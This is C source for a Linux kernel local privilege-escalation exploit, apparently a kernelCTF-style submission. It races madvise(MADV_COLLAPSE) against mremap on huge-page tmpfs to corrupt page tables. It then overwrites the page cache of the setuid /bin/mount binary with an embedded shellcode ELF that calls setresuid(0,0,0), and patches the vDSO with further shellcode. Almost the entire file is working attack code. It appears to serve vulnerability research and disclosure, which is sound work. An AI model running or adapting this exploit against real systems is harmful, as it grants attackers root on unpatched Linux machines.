#define _GNU_SOURCE
#include <err.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <sys/wait.h>
#include <unistd.h>


// ============================================================================
// MACROS AND CONSTANTS
// ============================================================================

/**
 * @brief Utility to wait for a signal, avoiding busy loops or long sleeps.
 */
static void hang(void) {
  pause();
}

/* Color definitions for logging */
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

/* Logging macros */
#define logd(fmt, ...) \
  dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...) \
  dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
          __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...) \
  dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
          __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...) \
  dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
          __LINE__, ##__VA_ARGS__)
#define die(fmt, ...) \
  do { \
    loge(fmt, ##__VA_ARGS__); \
    loge("Exit at line %d", __LINE__); \
    exit(1); \
  } while (0)

/* Define MADV_COLLAPSE if not already defined */
#ifndef MADV_COLLAPSE
#define MADV_COLLAPSE 25
#endif

#define NSEC_PER_SEC 1000000000UL

/* Syscall check macro */
#define SYSCHK(x) \
  ({ \
    typeof(x) __res = (x); \
    if (__res == (typeof(x))-1) \
      err(1, "SYSCHK(" #x ")"); \
    __res; \
  })

// ============================================================================
// BINARY PAYLOADS
// ============================================================================

/* SUID ELF binary payload to get a root shell */
unsigned char suid_elf[] = {
  // ELF header
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  // Shellcode goes here
  /*
    setresuid(0, 0, 0);
    /bin/sh -c 'cat /flag >& 2'
  */
    49,   255,  49,   210,  49,   246,  106,  117,  88,   15,   5,    72,
    184,  1,    1,    1,    1,    1,    1,    1,    1,    80,   72,   184,
    46,   99,   104,  111,  46,   114,  105,  1,    72,   49,   4,    36,
    72,   137,  231,  104,  63,   39,   51,   1,    129,  52,   36,   1,
    1,    1,    1,    72,   184,  116,  32,   47,   102,  108,  97,   103,
    32,   80,   72,   184,  1,    1,    1,    1,    1,    1,    1,    1,
    80,   72,   184,  114,  105,  1,    44,   98,   1,    98,   96,   72,
    49,   4,    36,   49,   246,  86,   106,  14,   94,   72,   1,    230,
    86,   106,  19,   94,   72,   1,    230,  86,   106,  24,   94,   72,
    1,    230,  86,   72,   137,  230,  49,   210,  106,  59,   88,   15,
    5};

/*
  /bin/sh -c 'id >& 2 && /chroot/bin/mount >& 2'
*/
unsigned char vdso_shellcode[] = {
    72,  184, 1,   1,   1,   1,   1,   1,    1,   1,   80,  72,  184, 46,  99,
    104, 111, 46,  114, 105, 1,   72,  49,   4,   36,  72,  137, 231, 72,  184,
    1,   1,   1,   1,   1,   1,   1,   1,    80,  72,  184, 117, 33,  63,  39,
    51,  1,   1,   1,   72,  49,  4,   36,   72,  184, 98,  105, 110, 47,  109,
    111, 117, 110, 80,  72,  184, 47,  99,   104, 114, 111, 111, 116, 47,  80,
    72,  184, 32,  62,  38,  50,  32,  38,   38,  32,  80,  72,  184, 1,   1,
    1,   1,   1,   1,   1,   1,   80,  72,   184, 114, 105, 1,   44,  98,  1,
    104, 101, 72,  49,  4,   36,  49,  246,  86,  106, 14,  94,  72,  1,   230,
    86,  106, 19,  94,  72,  1,   230, 86,   106, 24,  94,  72,  1,   230, 86,
    72,  137, 230, 49,  210, 106, 59,  88,   15,  5};

// ============================================================================
// CONFIGURATION AND GLOBAL STATE
// ============================================================================

/* Process types for tracking corrupted processes */
typedef enum {
  HIJACK_PROCESS = 0, /* Process that modifies SUID binary and VDSO in the victim */
  VICTIM_PROCESS = 1, /* Process whose memory will be overwritten */
  MAX_PROCESSES = 2   /* Total number of processes needed */
} process_type_t;

/* Memory configuration structure */
struct memory_config {
    /* Page frame numbers for different memory regions */
    struct {
        size_t no_crash;  /* Page frame number for no-crash region */
        size_t suid;      /* Page frame number for SUID binary region */
        size_t vdso;      /* Page frame number for VDSO region */
    } pfn;
    
    /* Process-specific memory layouts */
    struct {
        size_t mmap_addr;    /* Initial mapping address */
        size_t mremap_addr;  /* Destination address for mremap */
    } layouts[MAX_PROCESSES];
    
    /* Page size configuration */
    size_t pmd_page_size;  /* Page Middle Directory size (Huge Page size) */
};

/*
 * Global memory configuration for the exploit.
 * These addresses and offsets are carefully chosen to control the memory layout
 * of both the hijack and victim processes.
 */
static const struct memory_config MEM_CONFIG = {
    .pfn = {.no_crash = 0x488 / 8, // PFN for a page that is touched to prevent crashes
                                   // after race.
            .suid = 0x80,          // PFN where the SUID binary will be mapped.
            .vdso = 0xc0},         // PFN where the VDSO will be remapped.
    /*
     * Select addresses for mappings, ensuring they don't overlap with other
     * mapped regions. Using different address ranges for hijack and victim
     * processes helps in debugging and avoids collisions.
     */
    .layouts = {[HIJACK_PROCESS] =
                    {
                        .mmap_addr = 0x200000,     /* Initial mapping address */
                        .mremap_addr = 0x40000000, /* Destination address for mremap */
                    },
                [VICTIM_PROCESS] =
                    {
                        .mmap_addr = 0x2000000,    /* Initial mapping address */
                        .mremap_addr = 0x60000000, /* Destination address for mremap */
                    }},
    .pmd_page_size = 0x1000 / 8 * 0x1000};

/*
 * Global state for the exploit.
 * Encapsulates all process IDs and synchronization objects.
 */
struct global_state {
  int corrupted_process_count;
  pid_t corrupted_pids[MAX_PROCESSES];
  pid_t current_child_pid;
  pid_t getflag_pid;
  struct timespec parent_launch_ts;
  struct timespec child_launch_ts;
  struct timespec base_time;
};
static struct global_state g_state = {0};

// ============================================================================
// TIME MANAGEMENT FUNCTIONS
// ============================================================================

/**
 * @brief Get current monotonic time.
 */
struct timespec get_mono_time(void) {
  struct timespec ts;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &ts));
  return ts;
}

/**
 * @brief Calculate elapsed time in nanoseconds between two timestamps.
 */
uint64_t elapsed_nsecs(const struct timespec *start, const struct timespec *end) {
  time_t secs_diff = end->tv_sec - start->tv_sec;
  long nsecs_diff = end->tv_nsec - start->tv_nsec;

  // Handle negative nanosecond difference by borrowing from seconds
  if (nsecs_diff < 0) {
    secs_diff -= 1;
    nsecs_diff += NSEC_PER_SEC;
  }

  uint64_t total_nsecs = (uint64_t)secs_diff * NSEC_PER_SEC + (uint64_t)nsecs_diff;
  return total_nsecs;
}

/**
 * @brief Subtract nanoseconds from timespec.
 */
void ts_sub(struct timespec *ts, unsigned long nsecs) {
  if (ts->tv_nsec < nsecs) {
    ts->tv_sec--;
    ts->tv_nsec += NSEC_PER_SEC;
  }
  ts->tv_nsec -= nsecs;
}

/**
 * @brief Add nanoseconds to timespec.
 */
void ts_add(struct timespec *ts, unsigned long nsecs) {
  ts->tv_nsec += nsecs;
  if (ts->tv_nsec >= NSEC_PER_SEC) {
    ts->tv_sec++;
    ts->tv_nsec -= NSEC_PER_SEC;
  }
}

/**
 * @brief Check if a timestamp is in the future.
 */
bool ts_is_in_future(struct timespec ts) {
  struct timespec cur = get_mono_time();
  if (ts.tv_sec > cur.tv_sec)
    return true;
  if (ts.tv_sec < cur.tv_sec)
    return false;
  return ts.tv_nsec > cur.tv_nsec;
}

// ============================================================================
// PROCESS AND NAMESPACE UTILITIES
// ============================================================================

/**
 * @brief Pin the current process to a specific CPU.
 */
static void pin_to_cpu(int cpu) {
  cpu_set_t cset;
  CPU_ZERO(&cset);
  CPU_SET(cpu, &cset);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &cset))
    err(1, "set affinity");
}

/**
 * @brief Write content to a file.
 */
static void write_to_file(const char *path, const char *content) {
  int fd = SYSCHK(open(path, O_WRONLY));
  if (write(fd, content, strlen(content)) != strlen(content))
    err(1, "write %s", path);
  close(fd);
}

/**
 * @brief Write UID/GID mapping for a new user namespace.
 */
static void write_userns_map(const char *path, int id) {
  char content[100];
  snprintf(content, sizeof(content), "0 %d 1", id);
  write_to_file(path, content);
}

// ============================================================================
// MEMORY REGION PARSING AND VDSO MANAGEMENT
// ============================================================================

/**
 * @brief Structure to hold memory region information from /proc/pid/maps.
 */
typedef struct {
  unsigned long start;
  unsigned long end;
  char permissions[5]; /* e.g., "r-xp" */
  char pathname[256];
} mem_region_t;

/**
 * @brief Parse a line from /proc/<PID>/maps and fill the mem_region_t structure.
 * @return 1 on success, 0 on failure.
 */
int parse_map_line(const char *line, mem_region_t *region) {
  // Initialize pathname to empty string
  region->pathname[0] = '\0';

  // Example line format:
  // 7ffd071f2000-7ffd071f6000 r--p 00000000 00:00 0 [vdso]
  int fields = sscanf(line, "%lx-%lx %4s %*s %*s %*s %255[^\n]", &region->start,
                      &region->end, region->permissions, region->pathname);
  if (fields < 4) {
    // If pathname is missing, set it to empty
    region->pathname[0] = '\0';
  }
  return 1;
}

/**
 * @brief Retrieves the [vdso] memory region address range for a given process.
 *
 * @param pid         Process ID of the target process.
 * @param start_addr  Pointer to store the start address of [vdso].
 * @param end_addr    Pointer to store the end address of [vdso].
 * @return            0 on success, -1 on failure.
 */
int get_vdso_region(pid_t pid, unsigned long *start_addr, unsigned long *end_addr) {
  char maps_path[256];
  FILE *maps_file = NULL;
  char line[512];
  mem_region_t region;
  int found = 0;

  if (start_addr == NULL || end_addr == NULL) {
    fprintf(stderr, "Invalid address pointers provided.\n");
    return -1;
  }

  // Construct path to /proc/<PID>/maps
  snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);

  // Open /proc/<PID>/maps
  maps_file = fopen(maps_path, "r");
  if (!maps_file) {
    fprintf(stderr, "Error opening %s: %m\n", maps_path);
    return -1;
  }

  // Parse /proc/<PID>/maps to find [vdso]
  while (fgets(line, sizeof(line), maps_file)) {
    if (strstr(line, "[vdso]")) {
      parse_map_line(line, &region);
      found = 1;
      break;
    }
  }

  fclose(maps_file);

  if (!found) {
    fprintf(stderr, "Failed to find [vdso] region in /proc/%d/maps\n", pid);
    return -1;
  }

  *start_addr = region.start;
  *end_addr = region.end;

  return 0;
}

// ============================================================================
// MEMORY DUMPING UTILITY
// ============================================================================

/**
 * @brief Dump memory contents in hexadecimal format.
 */
void DumpHex(const void *data, size_t size) {
  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char *)data)[i]);
    
    if (((unsigned char *)data)[i] >= ' ' && ((unsigned char *)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char *)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    
    if ((i + 1) % 8 == 0 || i + 1 == size) {
      printf(" ");
      if ((i + 1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i + 1 == size) {
        ascii[(i + 1) % 16] = '\0';
        if ((i + 1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i + 1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
}

// ============================================================================
// SIGNAL HANDLERS
// ============================================================================

void sigusr1_hijack_process_handler(int signum);
void sigusr1_victim_process_handler(int signum);

typedef void (*signal_handler_t)(int);
signal_handler_t g_race_child_signal_handlers[] = {
    sigusr1_hijack_process_handler, sigusr1_victim_process_handler};

/**
 * @brief Parent's SIGUSR1 handler: triggered by a child that won the race.
 *        Records the PID of the successful child process.
 */
void sigusr1_parent_handler(int signum) {
  if (g_state.corrupted_process_count < MAX_PROCESSES) {
    g_state.corrupted_pids[g_state.corrupted_process_count++] =
        g_state.current_child_pid;
    logi("Successfully identified a vulnerable process (PID: %d)",
         g_state.current_child_pid);
  }
}

/**
 * @brief Parent's SIGUSR2 handler: triggered by the victim process after it
 *        has finished mapping the SUID binary and VDSO.
 */
void sigusr2_parent_handler(int signum) {
  logd("Signal received, victim has mapped memory.");
}

/**
 * @brief Getflag process's SIGUSR1 handler: triggered by the hijack process
 *        to execute the final payload outside the exploit's namespace.
 */
void sigusr1_getflag_handler(int signum) {
  system("/bin/mount");
  exit(0);
}

/**
 * @brief Hijack process's SIGUSR1 handler: overwrites SUID and VDSO memory
 * regions in the victim process.
 */
void sigusr1_hijack_process_handler(int signum) {
  logd("Hijacking SUID binary...");
  mprotect((void *)(MEM_CONFIG.layouts[HIJACK_PROCESS].mremap_addr +
                   MEM_CONFIG.pfn.suid * 0x1000),
           0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);

  memcpy((void *)(MEM_CONFIG.layouts[HIJACK_PROCESS].mremap_addr +
                   MEM_CONFIG.pfn.suid * 0x1000),
         suid_elf, sizeof(suid_elf));

  // If running in PR verification without nsjail, we can directly access the flag
  if (access("/flag", F_OK) == 0) {
    puts("Attempting to read flag...");
    // Signal the getflag process to read the flag
    kill(g_state.getflag_pid, SIGUSR1);
    // Wait briefly to ensure the flag is read
    sleep(1);
    /* Shutdown immediately to speed up the next attempt in PR verification workflow */
    kill(getppid(), SIGKILL);
    exit(0);
  }

  // If inside nsjail (real mitigation instance), we need to hijack the VDSO to read the flag
  logd("Hijacking VDSO region...");
  unsigned long vdso_start = 0, vdso_end = 0;
  get_vdso_region(getpid(), &vdso_start, &vdso_end);
  mprotect((void *)(MEM_CONFIG.layouts[HIJACK_PROCESS].mremap_addr +
                   MEM_CONFIG.pfn.vdso * 0x1000),
           vdso_end - vdso_start, PROT_READ | PROT_WRITE | PROT_EXEC);

  memcpy((void *)(MEM_CONFIG.layouts[HIJACK_PROCESS].mremap_addr +
                   MEM_CONFIG.pfn.vdso * 0x1000 + 0xd94),
         vdso_shellcode, sizeof(vdso_shellcode));
  memset((void *)(MEM_CONFIG.layouts[HIJACK_PROCESS].mremap_addr +
                 MEM_CONFIG.pfn.vdso * 0x1000 + 0x650),
         '\x90', 0xd94 - 0x650);
  DumpHex((void *)(MEM_CONFIG.layouts[HIJACK_PROCESS].mremap_addr +
                  MEM_CONFIG.pfn.vdso * 0x1000),
          0x100);

  /* Hang the process */
  hang();
}

/**
 * @brief Victim process's SIGUSR1 handler: maps the SUID binary and remaps
 *        the VDSO to the corrupted memory region.
 */
void sigusr1_victim_process_handler(int signum) {
  logd("Mapping SUID binary...");
  int suid_fd = open("/bin/mount", O_RDONLY);
  SYSCHK(mmap((void *)(MEM_CONFIG.layouts[VICTIM_PROCESS].mremap_addr +
                     MEM_CONFIG.pfn.suid * 0x1000),
              0x1000, PROT_READ, MAP_SHARED | MAP_FIXED, suid_fd, 0));
  DumpHex((void *)(MEM_CONFIG.layouts[VICTIM_PROCESS].mremap_addr +
                  MEM_CONFIG.pfn.suid * 0x1000),
          0x10);

  logd("Mapping VDSO region...");
  unsigned long vdso_start = 0, vdso_end = 0;
  get_vdso_region(getpid(), &vdso_start, &vdso_end);
  SYSCHK(mremap((void *)vdso_start, vdso_end - vdso_start, vdso_end - vdso_start,
                MREMAP_FIXED | MREMAP_MAYMOVE,
                MEM_CONFIG.layouts[VICTIM_PROCESS].mremap_addr +
                    MEM_CONFIG.pfn.vdso * 0x1000));

  for (size_t i = MEM_CONFIG.layouts[VICTIM_PROCESS].mremap_addr +
                  MEM_CONFIG.pfn.vdso * 0x1000;
       i < MEM_CONFIG.layouts[VICTIM_PROCESS].mremap_addr +
               MEM_CONFIG.pfn.vdso * 0x1000 + vdso_end - vdso_start;
       i += 0x1000) {
    DumpHex((void *)i, 0x10);
  }

  logd("Memory mapping complete");

  /* Tell the parent process that the memory mapping is complete */
  kill(getppid(), SIGUSR2);

  /* Hang the process */
  hang();
}

// ============================================================================
// RACE CONDITION AND EXPLOIT LOGIC
// ============================================================================

/* Forward declarations */
void detect_successful_race(size_t mremap_addr_now);

/**
 * @brief Set up the shared memory mapping for the race condition.
 *        Creates a huge page mapping for MADV_COLLAPSE.
 *
 * @param mmap_addr Address where memory should be mapped.
 * @return Pointer to the mapped memory region.
 */
void *setup_memory_mapping(size_t mmap_addr) {
  /* Create and map a temporary file */
  int fd = SYSCHK(open("/tmp/a", O_RDWR | O_CREAT, 0600));
  void *ptr =
      SYSCHK(mmap((void *)mmap_addr, MEM_CONFIG.pmd_page_size,
                  PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd, 0));

  /* Set up huge page */
  SYSCHK(ftruncate(fd, 0x1000));
  *((volatile char *)ptr) = 'a';
  SYSCHK(ftruncate(fd, MEM_CONFIG.pmd_page_size));
  SYSCHK(madvise(ptr, MEM_CONFIG.pmd_page_size, MADV_HUGEPAGE));
  close(fd);
  SYSCHK(unlink("/tmp/a"));

  return ptr;
}

/**
 * @brief Configure timers for race timing synchronization.
 *
 * @param base_time Current time, used as a base for launch times.
 */
void configure_race_timers(struct timespec base_time) {
  /* Set up timer to fire 5ms in the future */
  struct itimerspec its = {.it_value = base_time};
  ts_add(&its.it_value, 5000 * 1000); // Timer at +5 ms

  g_state.parent_launch_ts = its.it_value;
  g_state.child_launch_ts = its.it_value;
}

/**
 * @brief Run child process part of the race condition. This process calls mremap.
 *
 * @param ptr Pointer to the mapped memory.
 * @param mmap_addr_now The source memory mapping address.
 * @param mremap_addr_now The destination memory mapping address.
 * @return 0 on success.
 */
int child_race_logic(void *ptr, size_t mmap_addr_now, size_t mremap_addr_now) {
  // Simply pin child process to a different CPU
  pin_to_cpu(0);

  /* Set up signal handler for this child */
  struct sigaction sa;
  sa.sa_handler = g_race_child_signal_handlers[g_state.corrupted_process_count];
  sa.sa_flags = 0;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR1, &sa, NULL) == -1) {
    perror("sigaction failed");
    exit(EXIT_FAILURE);
  }

  /* Touch all pages to ensure they're mapped */
  for (int i = 0; i < 512; i++)
    ((volatile char *)ptr)[0x1000 * i] = 'a';

  /* Wait until precise launch time */
  while (ts_is_in_future(g_state.child_launch_ts)) /*spin*/
    ;

  SYSCHK(mremap((void *)mmap_addr_now, MEM_CONFIG.pmd_page_size,
                MEM_CONFIG.pmd_page_size, MREMAP_MAYMOVE | MREMAP_FIXED,
                (void *)mremap_addr_now));

  /* Check for a successful race condition */
  detect_successful_race(mremap_addr_now);
  return 0;
}

/**
 * @brief Check if the race condition was successful by examining memory contents.
 *
 * @param mremap_addr_now The destination memory mapping address.
 */
void detect_successful_race(size_t mremap_addr_now) {
  // Make the page table entry valid and flush the TLB.
  // This sequence of mprotect calls helps stabilize the corrupted PTE.
  // See more:
  // https://github.com/google/security-research/pull/168/files#diff-04760418e9737440eec5fc28f745650a2e684da6ddee9d22fc1bb1f639ca28d8
  mprotect((void *)(mremap_addr_now + MEM_CONFIG.pfn.no_crash * 0x1000), 0x1000,
           PROT_READ | PROT_WRITE | PROT_EXEC);
  mprotect((void *)(mremap_addr_now + MEM_CONFIG.pfn.no_crash * 0x1000), 0x1000,
           PROT_READ);
  mprotect((void *)(mremap_addr_now + MEM_CONFIG.pfn.no_crash * 0x1000), 0x1000,
           PROT_READ | PROT_WRITE | PROT_EXEC);

  int dump_cont =
      *(int *)(mremap_addr_now + MEM_CONFIG.pfn.no_crash * 0x1000);

  // If the memory content is not 'a' (0x61), the page has been corrupted.
  if (dump_cont != 0x61) {
    puts("Vulnerable process identified!");
    kill(getppid(), SIGUSR1);
    /* Hang the process */
    hang();
  }
}

/**
 * @brief Run parent process part of the race condition. This process calls madvise.
 *
 * @param ptr Pointer to the mapped memory.
 * @return 0 on success.
 */
int parent_race_logic(void *ptr) {
  // Simply pin parent process to a specific CPU
  pin_to_cpu(1);
  /* Touch all pages to ensure they're mapped */
  for (int i = 0; i < 512; i++)
    ((volatile char *)ptr)[0x1000 * i] = 'a';

  /* Wait until precise launch time */
  while (ts_is_in_future(g_state.parent_launch_ts)) /*spin*/
    ;

  /* Trigger the race condition with MADV_COLLAPSE */
  int madv_res = madvise(ptr, 0x200000, MADV_COLLAPSE);
  if (madv_res == -1)
    fprintf(stderr, "_");

  return 0;
}

// ============================================================================
// SETUP FUNCTIONS
// ============================================================================

/**
 * @brief Set up all necessary signal handlers for process coordination.
 */
static void setup_signal_handlers() {
  struct sigaction sa;
  sa.sa_flags = 0;
  sigemptyset(&sa.sa_mask);

  // Handler for parent to catch signals from successful child racers
  sa.sa_handler = sigusr1_parent_handler;
  if (sigaction(SIGUSR1, &sa, NULL) == -1)
    die("sigaction(SIGUSR1) failed");

  // Handler for parent to know when victim has mapped memory
  sa.sa_handler = sigusr2_parent_handler;
  if (sigaction(SIGUSR2, &sa, NULL) == -1)
    die("sigaction(SIGUSR2) failed");
}

/**
 * @brief Set up new user and mount namespaces.
 *
 * This is required to mount a tmpfs with transparent huge pages enabled,
 * which is a prerequisite for MADV_COLLAPSE.
 */
static void setup_namespace() {
  int outer_uid = getuid();
  int outer_gid = getgid();

  SYSCHK(unshare(CLONE_NEWNS | CLONE_NEWUSER));
  SYSCHK(mount(NULL, "/", NULL, MS_PRIVATE | MS_REC, NULL));

  write_to_file("/proc/self/setgroups", "deny");
  write_userns_map("/proc/self/uid_map", outer_uid);
  write_userns_map("/proc/self/gid_map", outer_gid);

  /* Mount tmpfs with THP support */
  SYSCHK(mount("none", "/tmp", "tmpfs", MS_NOSUID | MS_NODEV, "huge=advise"));
}

// ============================================================================
// MAIN FUNCTION
// ============================================================================

int main(void) {
  srand(time(NULL));
  setbuf(stdout, 0);
  setbuf(stderr, 0);

  // Set a 30-minute timeout
  alarm(30 * 60);

  /* Fork a process to retrieve the flag - must run outside exploit namespace */
  g_state.getflag_pid = fork();
  if (!g_state.getflag_pid) {
    struct sigaction sa;
    sa.sa_handler = sigusr1_getflag_handler;
    sa.sa_flags = 0;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGUSR1, &sa, NULL) == -1)
      die("sigaction failed in getflag process");
    hang();
  }

  /* Set up signal handlers for the main process */
  setup_signal_handlers();

  /* Set up new mount namespace for tmpfs with THP */
  setup_namespace();

  logi("Starting race to find vulnerable processes...");
  while (1) {
    /* Exit loop once we've found two vulnerable processes */
    if (g_state.corrupted_process_count >= MAX_PROCESSES)
      break;

    size_t mmap_addr_now =
               MEM_CONFIG.layouts[g_state.corrupted_process_count].mmap_addr,
           mremap_addr_now =
               MEM_CONFIG.layouts[g_state.corrupted_process_count].mremap_addr;

    /* Set up memory regions for the race condition */
    void *ptr = setup_memory_mapping(mmap_addr_now);

    /* Set up race timing */
    g_state.base_time = get_mono_time();
    configure_race_timers(g_state.base_time);

    /* Fork child process to run the race condition */
    g_state.current_child_pid = SYSCHK(fork());
    if (g_state.current_child_pid == 0) {
      /* Child process */
      return child_race_logic(ptr, mmap_addr_now, mremap_addr_now);
    }

    /* Parent process */
    parent_race_logic(ptr);

    /* Wait for child process to finish */
    int wstatus;
    if (waitpid(g_state.current_child_pid, &wstatus, 0) < 0) {
      // Intended Error: Interrupted system call
      // This indicates the parent received a signal from the child,
      // meaning a vulnerable process was found.
      puts("Signal received from child process");
    }

    /* Clean up memory */
    SYSCHK(munmap(ptr, 0x200000));

    fprintf(stderr, ".");
  }

  /* We've found two vulnerable processes - begin exploitation */
  logi("Successfully found two vulnerable processes - PIDs: %d (hijack) and "
       "%d (victim)",
       g_state.corrupted_pids[HIJACK_PROCESS],
       g_state.corrupted_pids[VICTIM_PROCESS]);

  /* Trigger the exploit by signaling victim process to map SUID binary and VDSO region */
  logd("Signaling victim process to map memory...");
  kill(g_state.corrupted_pids[VICTIM_PROCESS], SIGUSR1);

  /* Wait for the memory mapping to complete */
  waitpid(g_state.corrupted_pids[VICTIM_PROCESS], NULL, 0);

  /* Signal the hijack process to modify the SUID binary and VDSO region */
  logd("Signaling hijack process to overwrite memory...");

  /* Tell the getflag process to read the flag */
  kill(g_state.corrupted_pids[HIJACK_PROCESS], SIGUSR1);

  /* Hang the process */
  hang();
}